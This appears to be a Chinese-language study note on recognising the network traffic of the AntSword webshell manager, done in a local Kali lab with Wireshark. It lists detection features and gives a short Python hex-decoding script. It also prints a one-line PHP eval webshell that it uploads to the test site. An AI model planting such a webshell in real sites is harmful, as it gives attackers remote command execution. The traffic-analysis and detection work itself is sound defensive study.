## 蚁剑流量特征

### 基本特征

在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件

![image-20240507235421064](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405072354139.png)

内容如下

```php
#1.php
<?php
eval($_POST['cmd']);
?>
```

然后打开`wireshark`，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了

![image-20240507235611611](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405072356675.png)

这个就是蚁剑连接该ip的流量包了，我们右键红框那条，然后查看`TCP流`

![image-20240507235718646](https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405072357718.png)

这个就是蚁剑的流量包内容。现在可以总结蚁剑流量的基本特征

```
1. 请求包中有`ini_set`函数
2. 连接命令在第一个=前
3. 使用的是php语言
```


不过这个不是什么编码，研究代码逻辑后，会发现解密关键在于将每两个字符前面加上`%`，然后进行url解码。可以编写脚本

```python
from urllib.parse import unquote,quote

a = "77696E676C65740D0A"
for i in range(0,len(a),2):
    if __name__ == '__main__':
        tmp = unquote(f"%{a[i]}{a[i+1]}")
        print(tmp, end="")

# winglet
```
